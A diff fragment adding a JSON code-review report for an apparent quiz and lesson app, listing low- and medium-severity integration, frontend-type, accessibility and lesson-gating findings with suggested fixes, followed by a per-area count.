+      "area": "integration",
+      "severity": "low",
+      "file": "backend/app/api/v1/serializers.py",
+      "line": "111-118",
+      "title": "ItemPublic.points always serialized as the default 10",
+      "detail": "item_public() never passes `points`, so ItemPublic.points (schemas/questions.py:107) is always 10 regardless of the real value. The authoritative per-question points live on QuizQuestionPublic.points (correctly populated from qq.points at serializers.py:185) and TestView.vue:132 reads current.points (the question level), so this is currently harmless — but item.points is a misleading constant that will bite anyone who reads it (e.g. lesson-embedded items have no QuizQuestion wrapper).",
+      "suggested_fix": "Either drop `points` from ItemPublic (it is redundant with QuizQuestionPublic.points) or populate it from item.points in item_public().",
+      "confidence": 0.65
+    },
+    {
+      "area": "integration",
+      "severity": "low",
+      "file": "backend/app/services/leveling.py",
+      "line": "54-61",
+      "title": "item_xp signature/formula drift from SPEC §7 (no runtime impact)",
+      "detail": "SPEC §7 freezes `item_xp(base, item_difficulty, mastery_before)` = round(base*diff/3*(1-mastery)). The implementation is `item_xp(item_difficulty, mastery_before, *, base=BASE_ITEM_XP)` and the caller (gamification.py:466) uses the positional (item_difficulty, mastery_before) form, so impl and caller agree and runtime is correct. This is documentation/contract drift only, but it violates the 'frozen signature' invariant and would break any code written against the SPEC signature. (combo_multiplier is likewise sync though SPEC §7 lists it async; caller also treats it sync, so no runtime issue.)",
+      "suggested_fix": "Align the SPEC §7 signature with the implementation (or vice versa) so the frozen contract matches the code; same for the async/sync note on combo_multiplier.",
+      "confidence": 0.6
+    },
+    {
+      "area": "frontend",
+      "severity": "medium",
+      "file": "frontend/src/components/gamification/types.ts",
+      "line": "40-46",
+      "title": "MasteryChange type drifts from backend (concept_id vs concept)",
+      "detail": "The frontend `MasteryChange` declares `concept: string`, but the backend `MasteryChange` schema (backend/app/schemas/gamification.py lines 85-90, part of ResultsSummary returned by POST /attempts/{id}/complete) emits `concept_id: int` plus `name: str` — there is no `concept` field. Any F4 results screen that reads `mastery_changes[].concept` will get `undefined`. The frontend's own `KnowledgeTree` mirror also uses `concept_id`, so this is internally inconsistent too. ResultsView is still a placeholder, so this is currently latent, but it will silently break the results 'mastery changes' list when F4 lands.",
+      "suggested_fix": "Change the field to `concept_id: number` (drop/keep `name: string`) to match backend MasteryChange: `{ concept_id: number; name: string; before: number; after: number; state: NodeState }`.",
+      "confidence": 0.85
+    },
+    {
+      "area": "frontend",
+      "severity": "medium",
+      "file": "frontend/src/components/gamification/types.ts",
+      "line": "28-32",
+      "title": "TreeEdge type drifts from backend (from_id/to_id vs from/to)",
+      "detail": "Frontend `TreeEdge` is `{ from: number; to: number; type: string }`, but the backend `TreeEdge` (backend/app/schemas/gamification.py lines 138-142, returned by GET /profiles/me/tree) emits `{ from_id: int; to_id: int; type: str }`. The comment even claims type is 'prereq'|'related' while the backend doc says 'prerequisite'|'related'. KnowledgeTree.vue currently renders relationships from node `prereq_ids`/`related_ids` rather than `edges`, so this is latent, but any code that consumes `data.edges[].from/.to` will read undefined.",
+      "suggested_fix": "Rename to `from_id: number; to_id: number` to match the backend, and align the `type` comment to 'prerequisite' | 'related'.",
+      "confidence": 0.85
+    },
+    {
+      "area": "frontend",
+      "severity": "low",
+      "file": "frontend/src/components/questions/HotspotQuestion.vue",
+      "line": "49-53",
+      "title": "Hotspot image fallback URL omits the /api/v1 prefix",
+      "detail": "imageSrc builds `/assets/${payload.image_asset_hash}` when only the hash is present, but the real asset route is mounted at `/api/v1/assets/{hash}` (backend/app/api/v1/router.py prefix `/api/v1` + assets.py prefix `/assets`; serializer emits url=`/api/v1/assets/{hash}`). The backend serializer normally also fills `image_url` for hotspot items (serializers.py lines 106-110), so the happy path is unaffected, but if a hotspot ever ships with only `image_asset_hash` (no `image_url`) the image will 404. LessonAsset correctly uses the server-provided `asset.url`.",
+      "suggested_fix": "Use the API base / server-provided url for the fallback, e.g. ``return `${import.meta.env.VITE_API_BASE || '/api/v1'}/assets/${payload.value.image_asset_hash}` `` (or rely solely on the serializer-provided image_url).",
+      "confidence": 0.8
+    },
+    {
+      "area": "frontend",
+      "severity": "low",
+      "file": "frontend/src/components/questions/FillBlankQuestion.vue",
+      "line": "97-114",
+      "title": "Cloze blank aria-label uses the segment index, not the blank number",
+      "detail": "Both the <select> and <input> set `:aria-label=\"t('q.cloze.blank_n', { n: i })\"` where `i` is the v-for index over ALL segments (text + blanks), not the blank's ordinal. For a template like 'The {{a}} eats {{b}}' the blanks announce as 'Blank 1' and 'Blank 3' (text segments consume indices), confusing screen-reader users. Functionality and the emitted Record<blankId,string> value are correct; only the label is wrong.",
+      "suggested_fix": "Track a running blank counter (e.g. compute a `blankNumber` per blank segment) and pass that to `blank_n` instead of the segment index `i`.",
+      "confidence": 0.82
+    },
+    {
+      "area": "frontend",
+      "severity": "low",
+      "file": "frontend/src/components/questions/TrueFalseQuestion.vue",
+      "line": "64-87",
+      "title": "True/False radiogroup lacks arrow-key navigation (incomplete ARIA radio pattern)",
+      "detail": "The two options are <button role=\"radio\"> inside role=\"radiogroup\" with aria-checked, but there is no ArrowLeft/Right/Up/Down handler and both buttons remain in the tab order. The WAI-ARIA radiogroup pattern expects arrow keys to move selection and only the checked (or first) radio to be tabbable. This is not a blocker — each button is independently operable via Tab + Enter/Space and the emitted boolean value is correct — but it does not fully meet the expected radio semantics for AT users.",
+      "suggested_fix": "Either add arrow-key handling + roving tabindex to honor the radiogroup pattern, or drop role=\"radiogroup\"/role=\"radio\"/aria-checked and present them as two aria-pressed toggle buttons (matching the MCQ/hotspot pattern already used).",
+      "confidence": 0.6
+    },
+    {
+      "area": "frontend",
+      "severity": "low",
+      "file": "frontend/src/views/LessonView.vue",
+      "line": "76-94",
+      "title": "Backend-gated FIRST interactive lesson section can deadlock (latent)",
+      "detail": "isLocked() locks a section when `s.gated && !sectionAttempted(s)`; for the first interactive section (interactiveOrdinals index 0) the `else` branch returns true, so it stays locked. Because a locked section's items are never rendered, `sectionAttempted` can never become true — a permanent lock. This is currently latent only because the lesson generator never sets `gated` (backend/app/models/content.py defaults gated=False and lesson_generator.py never assigns it), so the active gating path is the progressive-unlock branch (lines 88-93), which is correct. If the backend ever emits a gated first interactive section, the learner is stuck.",
+      "suggested_fix": "Treat a backend-gated section with no preceding interactive section as initially unlocked (return false when idx <= 0), mirroring the progressive-unlock branch; or only enforce backend `gated` once at least one prior interactive section exists.",
+      "confidence": 0.7
+    },
+    {
+      "area": "frontend",
+      "severity": "low",
+      "file": "frontend/src/components/content/LessonSection.vue",
+      "line": "39-77",
+      "title": "Unused LessonSection component duplicates LessonView gating with weaker behavior",
+      "detail": "LessonSection.vue renders body, assets, AND interactive items even when `disabled` (just dimmed to opacity 0.6 with disabled inputs), which would visually reveal gated practice content. The actually-rendered LessonView.vue does NOT import LessonSection and instead hides gated content behind a lock hint. So LessonSection is effectively dead code; if it is ever wired in, its gating would leak gated content (contradicting the LessonView gating intent). Not a live defect today.",
+      "suggested_fix": "Either remove LessonSection.vue or have it hide body/assets/items (not just dim) when `disabled`, matching LessonView's gating, and have LessonView reuse it to avoid divergence.",
+      "confidence": 0.55
+    }
+  ],
+  "by_area": [
+    {
+      "area": "security",
+      "count": 4
+    },
+    {
+      "area": "gamification",
+      "count": 7
+    },
+    {
+      "area": "generation",
+      "count": 6
+    },
+    {
+      "area": "integration",
+      "count": 6
+    },
+    {
+      "area": "frontend",
+      "count": 7
+    }
+  ]
+}
